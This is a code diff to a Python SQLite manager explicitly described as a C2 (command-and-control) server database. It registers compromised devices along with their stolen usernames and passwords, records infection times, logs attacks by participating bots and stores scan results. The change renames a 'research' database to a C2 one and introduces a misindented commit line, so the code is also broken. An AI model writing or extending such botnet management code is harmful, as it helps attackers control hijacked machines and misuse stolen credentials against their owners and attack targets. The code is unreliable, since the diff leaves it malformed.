@@ -1,10 +1,15 @@
+# C2 server database manager
 import sqlite3
 import logging
 import threading
+import os
 from datetime import datetime
 
 class DatabaseManager:
-    def __init__(self, db_path='research_db.sqlite'):
+    def __init__(self, db_path='c2_database.db'):
+        # If db_path is not absolute, make it absolute relative to this file
+        if not os.path.isabs(db_path):
+            db_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), db_path)
         self.db_path = db_path
         self.db_lock = threading.Lock()
         self.init_database()
@@ -56,14 +61,22 @@ class DatabaseManager:
                 status TEXT
             )
         ''')
-        
-        conn.commit()
+          conn.commit()
         conn.close()
         logging.info("Database initialized successfully")
     
     def get_connection(self):
-        """Get database connection"""
-        return sqlite3.connect(self.db_path)
+        """Get database connection with error handling"""
+        try:
+            conn = sqlite3.connect(self.db_path)
+            # Enable foreign keys support
+            conn.execute("PRAGMA foreign_keys = ON")
+            # Return dictionary-like objects instead of tuples
+            conn.row_factory = sqlite3.Row
+            return conn
+        except sqlite3.Error as e:
+            logging.error(f"Database connection error: {e}")
+            raise
     
     def register_device(self, ip, username, password):
         """Register a compromised device"""
@@ -102,7 +115,10 @@ class DatabaseManager:
         cursor.execute('SELECT * FROM devices')
         devices = cursor.fetchall()
         conn.close()
-        return devices
+        
+        # Convert tuples to dictionaries
+        columns = ['id', 'ip', 'username', 'password', 'status', 'last_seen', 'infection_time']
+        return [dict(zip(columns, device)) for device in devices]
     
     def get_online_devices(self):
         """Get only online devices"""
@@ -111,7 +127,10 @@ class DatabaseManager:
         cursor.execute('SELECT * FROM devices WHERE status = "online"')
         devices = cursor.fetchall()
         conn.close()
-        return devices
+        
+        # Convert tuples to dictionaries
+        columns = ['id', 'ip', 'username', 'password', 'status', 'last_seen', 'infection_time']
+        return [dict(zip(columns, device)) for device in devices]
     
     def log_attack(self, attack_type, target, participating_bots):
         """Log attack information"""
@@ -140,4 +159,19 @@ class DatabaseManager:
         results = [{'ip': row[0], 'port': row[1], 'service': row[2], 'timestamp': row[3]} 
                   for row in cursor.fetchall()]
         conn.close()
-        return results 
+        return results
+        
+    def get_device(self, ip):
+        """Get device by IP address"""
+        conn = self.get_connection()
+        cursor = conn.cursor()
+        cursor.execute('SELECT * FROM devices WHERE ip = ?', (ip,))
+        device = cursor.fetchone()
+        conn.close()
+        
+        if not device:
+            return None
+            
+        # Convert tuple to dictionary
+        columns = ['id', 'ip', 'username', 'password', 'status', 'last_seen', 'infection_time']
+        return {columns[i]: device[i] for i in range(len(columns))}
